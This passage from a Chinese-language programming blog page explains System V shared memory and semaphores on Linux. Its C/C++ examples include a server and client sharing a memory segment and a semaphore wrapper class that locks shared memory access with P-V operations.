class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATHNAME <span class="string">&quot;.&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROJ_ID 0x6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">key_t</span> key = ftok(PATHNAME, PROJ_ID);</span><br><span class="line">    assert(key != <span class="number">-1</span>);</span><br><span class="line">    <span class="type">int</span> shmid;</span><br><span class="line">    <span class="keyword">if</span>((shmid = shmget(key, PAGE_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0666</span>)) == <span class="number">-1</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;shmget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *shmptr = shmat(shmid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i++ &lt; <span class="number">26</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;client# %s\n&quot;</span>,shmptr);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    shmdt(shmptr);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    assert(shmctl(shmid,IPC_RMID,<span class="literal">NULL</span>) != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client.c 用来连上共享内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATHNAME <span class="string">&quot;.&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROJ_ID 0x6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">key_t</span> key = ftok(PATHNAME,PROJ_ID);</span><br><span class="line">    assert(key != <span class="number">-1</span>);</span><br><span class="line">    <span class="type">int</span> shmid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>((shmid = shmget(key, PAGE_SIZE, <span class="number">0</span>)) == <span class="number">-1</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;shmget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *shmptr = shmat(shmid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; <span class="number">26</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        shmptr[i] = <span class="string">&#x27;A&#x27;</span> + i;</span><br><span class="line">        i++;</span><br><span class="line">        shmptr[i] = <span class="number">0</span>;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    shmdt(shmptr);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/10/18/shared-memory-and-semaphore-machenism/1.png" alt="1"></p><h1 id="信号量"><a class="markdownIt-Anchor" href="#信号量">#</a> 信号量</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">semget</span><span class="params">(<span class="type">key_t</span> key, <span class="type">int</span> nsems, <span class="type">int</span> semflg)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">semop</span><span class="params">(<span class="type">int</span> semid, <span class="keyword">struct</span> sembuf *sops, <span class="type">size_t</span> nsops)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">semctl</span><span class="params">(<span class="type">int</span> semid, <span class="type">int</span> semnum, <span class="type">int</span> cmd, ...)</span>;</span><br></pre></td></tr></table></figure><pre><code>   The  semget()  system  call  returns the System V semaphore set identifier associated with the argument key.</code></pre><p>创建方法两种 一种用 key 里的 <code>IPC_PRIVATE</code> ，一种用 semflg 里的 <code>IPC_CREAT</code> <br>nsems 是信号量个数。</p><p>semop 就是等待锁和释放锁<br>在 semctl 中 需要用到 <code>semun</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">semun</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>              val;    <span class="comment">/* Value for SETVAL */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">semid_ds</span> *<span class="title">buf</span>;</span>    <span class="comment">/* Buffer for IPC_STAT, IPC_SET */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>  *<span class="built_in">array</span>;  <span class="comment">/* Array for GETALL, SETALL */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seminfo</span>  *__<span class="title">buf</span>;</span>  <span class="comment">/* Buffer for IPC_INFO</span></span><br><span class="line"><span class="comment">                                (Linux-specific) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>semop 中 需要用到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span>&#123;</span></span><br><span class="line">         <span class="type">unsigned</span> <span class="type">short</span> sem_num;  <span class="comment">/* semaphore number */</span></span><br><span class="line">         <span class="type">short</span>          sem_op;   <span class="comment">/* semaphore operation */</span></span><br><span class="line">         <span class="type">short</span>          sem_flg;  <span class="comment">/* operation flags */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>sem_op 参数</strong>：</p><ul><li>sem_op &gt; 0          信号加上 sem_op 的值，表示进程释放控制的资源；</li><li>sem_op = 0          如果没有设置 IPC_NOWAIT，则调用进程进入睡眠状态，直到信号量的值为 0；否则进程不回睡眠，直接返回 EAGAIN</li><li>sem_op &lt; 0          信号加上 sem_op 的值。若没有设置 IPC_NOWAIT ，则调用进程阻塞，直到资源可用；否则进程直接返回 EAGAIN</li></ul></li><li><p><strong>sem_flg 参数</strong>：</p><ul><li>该参数可设置为 IPC_NOWAIT 或 SEM_UNDO 两种状态。只有将 sem_flg 指定为 SEM_UNDO 标志后，semadj （所指定信号量针对调用进程的调整值）才会更新。   此外，如果此操作指定 SEM_UNDO，系统更新过程中会撤消此信号灯的计数（semadj）。此操作可以随时进行 — 它永远不会强制等待的过程。调用进程必须有改变信号量集的权限。</li></ul></li><li></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CSEM</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">semun</span>  // 用于信号灯操作的共同体。</span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">semid_ds</span> *<span class="title">buf</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> *arry;</span><br><span class="line">  &#125;;</span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span>  sem_id;  <span class="comment">// 信号灯描述符。</span></span><br><span class="line">public:</span><br><span class="line">  <span class="type">bool</span> <span class="title function_">init</span><span class="params">(<span class="type">key_t</span> key)</span>; <span class="comment">// 如果信号灯已存在，获取信号灯；如果信号灯不存在，则创建信号灯并初始化。</span></span><br><span class="line">  <span class="type">bool</span> <span class="title function_">wait</span><span class="params">()</span>;          <span class="comment">// 等待信号灯挂出。</span></span><br><span class="line">  <span class="type">bool</span> <span class="title function_">post</span><span class="params">()</span>;          <span class="comment">// 挂出信号灯。</span></span><br><span class="line">  <span class="type">bool</span> <span class="title function_">destroy</span><span class="params">()</span>;       <span class="comment">// 销毁信号灯。</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">   CSEM sem;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// 用key值0x5000 初始信号灯。</span></span><br><span class="line">   <span class="keyword">if</span> (sem.init(<span class="number">0x5000</span>)==<span class="literal">false</span>) </span><br><span class="line">    &#123; <span class="built_in">printf</span>(<span class="string">&quot;sem.init failed.\n&quot;</span>); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;sem.init ok\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// 等待信信号挂出，等待成功后，将持有锁。</span></span><br><span class="line">   <span class="keyword">if</span> (sem.wait() == <span class="literal">false</span>) </span><br><span class="line">    &#123; <span class="built_in">printf</span>(<span class="string">&quot;sem.wait failed.\n&quot;</span>); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;sem.wait ok\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">   sleep(<span class="number">10</span>);  <span class="comment">// 在sleep的过程中，运行其它的book259程序将等待锁。</span></span><br><span class="line">  </span><br><span class="line">   <span class="comment">// 挂出信号灯，释放锁。</span></span><br><span class="line">   <span class="keyword">if</span> (sem.post() == <span class="literal">false</span>) </span><br><span class="line">    &#123; <span class="built_in">printf</span>(<span class="string">&quot;sem.post failed.\n&quot;</span>); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;sem.post ok\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// 销毁信号灯。</span></span><br><span class="line">   <span class="comment">// if (sem.destroy()==false) &#123; printf(&quot;sem.destroy failed.\n&quot;); return -1; &#125;</span></span><br><span class="line">   <span class="comment">// printf(&quot;sem.destroy ok\n&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">bool</span> <span class="title function_">CSEM::init</span><span class="params">(<span class="type">key_t</span> key)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 获取信号灯。</span></span><br><span class="line">  <span class="keyword">if</span> ( (sem_id=semget(key,<span class="number">1</span>,<span class="number">0640</span>)) == <span class="number">-1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果信号灯不存在，创建它。</span></span><br><span class="line">    <span class="comment">// No semaphore set exists for key and semflg did not specify IPC_CREAT.</span></span><br><span class="line">    <span class="keyword">if</span> (errno == ENOENT) </span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (sem_id=semget(key,<span class="number">1</span>,<span class="number">0640</span>|IPC_CREAT)) == <span class="number">-1</span>)</span><br><span class="line">        &#123; perror(<span class="string">&quot;init 1 semget()&quot;</span>); <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 信号灯创建成功后，还需要把它初始化成可用的状态。</span></span><br><span class="line">      <span class="class"><span class="keyword">union</span> <span class="title">semun</span> <span class="title">sem_union</span>;</span></span><br><span class="line">      <span class="comment">// 就是设置值为1</span></span><br><span class="line">      sem_union.val = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (semctl(sem_id,<span class="number">0</span>,SETVAL,sem_union) &lt;  <span class="number">0</span>) </span><br><span class="line">        &#123; perror(<span class="string">&quot;init semctl()&quot;</span>); <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123; perror(<span class="string">&quot;init 2 semget()&quot;</span>); <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">bool</span> <span class="title function_">CSEM::destroy</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (semctl(sem_id,<span class="number">0</span>,IPC_RMID) == <span class="number">-1</span>) </span><br><span class="line">    &#123; perror(<span class="string">&quot;destroy semctl()&quot;</span>); <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">bool</span> <span class="title function_">CSEM::wait</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span> <span class="title">sem_b</span>;</span></span><br><span class="line">  sem_b.sem_num = <span class="number">0</span>;</span><br><span class="line">  sem_b.sem_op = <span class="number">-1</span>;</span><br><span class="line">  sem_b.sem_flg = SEM_UNDO;</span><br><span class="line">  <span class="keyword">if</span> (semop(sem_id, &amp;sem_b, <span class="number">1</span>) == <span class="number">-1</span>) &#123; perror(<span class="string">&quot;wait semop()&quot;</span>); <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">bool</span> <span class="title function_">CSEM::post</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span> <span class="title">sem_b</span>;</span></span><br><span class="line">  sem_b.sem_num = <span class="number">0</span>;</span><br><span class="line">  sem_b.sem_op = <span class="number">1</span>;  </span><br><span class="line">  sem_b.sem_flg = SEM_UNDO;</span><br><span class="line">  <span class="keyword">if</span> (semop(sem_id, &amp;sem_b, <span class="number">1</span>) == <span class="number">-1</span>) &#123; perror(<span class="string">&quot;post semop()&quot;</span>); <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码最重要的一点是，在 semop 为 - 1 这里<br>等待一个其他进程执行 <code>(semop(sem_id, &amp;sem_b, 1)</code>  ，其中 <code>sem_b.sem_op = 1</code> , 也就是释放一个资源.<br> 而最初的资源数量是 <code>SETVAL</code>  所创建的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">CSEM::wait</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span> <span class="title">sem_b</span>;</span></span><br><span class="line">  sem_b.sem_num = <span class="number">0</span>;</span><br><span class="line">  sem_b.sem_op = <span class="number">-1</span>;</span><br><span class="line">  sem_b.sem_flg = SEM_UNDO;</span><br><span class="line">  <span class="keyword">if</span> (semop(sem_id, &amp;sem_b, <span class="number">1</span>) == <span class="number">-1</span>) &#123; perror(<span class="string">&quot;wait semop()&quot;</span>); <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="信号量对共享内存加锁"><a class="markdownIt-Anchor" href="#信号量对共享内存加锁">#</a> 信号量对共享内存加锁</h1><p>就是在共享内存操作之中使用上文提到的 wait 和 post，这其实就是个 P-V 操作，搞这么神神叨叨的。<br>然后这 PV 之间才对共享内存操作.<br> 部分代码再上文。<br>client.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *shmptr = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">shm_register</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> shmid = <span class="built_in">shmget</span>( (<span class="type">key_t</span>)<span class="number">0x5005</span>, <span class="number">1024</span>, <span class="number">0640</span>|IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span> ( shmid == <span class="number">-1</span> )</span><br><span class="line">      &#123; <span class="built_in">printf</span>(<span class="string">&quot;shmget() failed\n&quot;</span>);  <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">    shmptr = (<span class="type">char</span> *)<span class="built_in">shmat</span>(shmid, <span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> shmid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   CSEM sem;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// 用key值0x5000 初始信号灯。</span></span><br><span class="line">   <span class="keyword">if</span> (sem.<span class="built_in">init</span>(<span class="number">0x5000</span>)==<span class="literal">false</span>) </span><br><span class="line">    &#123; <span class="built_in">printf</span>(<span class="string">&quot;sem.init failed.\n&quot;</span>); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;sem.init ok\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// 等待信信号挂出，等待成功后，将持有锁。</span></span><br><span class="line">   <span class="keyword">if</span> (sem.<span class="built_in">wait</span>() == <span class="literal">false</span>) </span><br><span class="line">    &#123; <span class="built_in">printf</span>(<span class="string">&quot;sem.wait failed.\n&quot;</span>); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;sem.wait ok\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// 申请一个共享内存并将shmptr指过去</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Proc1 write 0x10 A to shm&quot;</span>);</span><br><span class="line">   <span class="type">int</span> shmid = <span class="built_in">shm_register</span>();</span><br><span class="line">   <span class="built_in">memset</span>(shmptr, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">   <span class="built_in">getchar</span>();</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// 挂出信号灯，释放锁。</span></span><br><span class="line">   <span class="keyword">if</span> (sem.<span class="built_in">post</span>() == <span class="literal">false</span>) </span><br><span class="line">    &#123; <span class="built_in">printf</span>(<span class="string">&quot;sem.post failed.\n&quot;</span>); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;sem.post ok\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">getchar</span>();</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Proc1 shm contents: %s\n&quot;</span>, shmptr);</span><br><span class="line">   <span class="comment">//detach shared memory</span></span><br><span class="line">   <span class="built_in">shmdt</span>(shmptr);</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// 销毁信号灯。</span></span><br><span class="line">   <span class="comment">// if (sem.destroy()==false) &#123; printf(&quot;sem.destroy failed.\n&quot;); return -1; &#125;</span></span><br><span class="line">   <span class="comment">// printf(&quot;sem.destroy ok\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>server.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *shmptr = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">shm_attach</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> shmid = <span class="built_in">shmget</span>( (<span class="type">key_t</span>)<span class="number">0x5005</span>, <span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( shmid == <span class="number">-1</span> )</span><br><span class="line">      &#123; <span class="built_in">printf</span>(<span class="string">&quot;shmget() failed\n&quot;</span>);  <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">    shmptr = (<span class="type">char</span> *)<span class="built_in">shmat</span>(shmid, <span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> shmid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   CSEM sem;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// 用key值0x5000 初始信号灯。</span></span><br><span class="line">   <span class="keyword">if</span> (sem.<span class="built_in">init</span>(<span class="number">0x5000</span>)==<span class="literal">false</span>) </span><br><span class="line">    &#123; <span class="built_in">printf</span>(<span class="string">&quot;sem.init 